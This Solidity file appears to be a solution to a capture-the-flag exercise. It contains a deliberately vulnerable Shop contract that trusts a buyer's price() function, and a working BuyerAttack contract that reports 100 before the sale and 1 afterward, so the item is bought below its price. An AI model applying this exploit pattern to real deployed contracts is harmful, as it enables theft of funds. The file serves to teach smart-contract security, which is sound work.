// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

// Here we want to implement the Buyer such that before shop "isSold" to being set to true - price should return at least 100
// When isSold is true... We can make price return less than 100.
contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract BuyerAttack is Buyer {
    Shop private shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view override returns (uint) {
        if (!shop.isSold()) {
            return 100;
        }
        return 1;
    }

    function buy() external {
        shop.buy();
    }
}
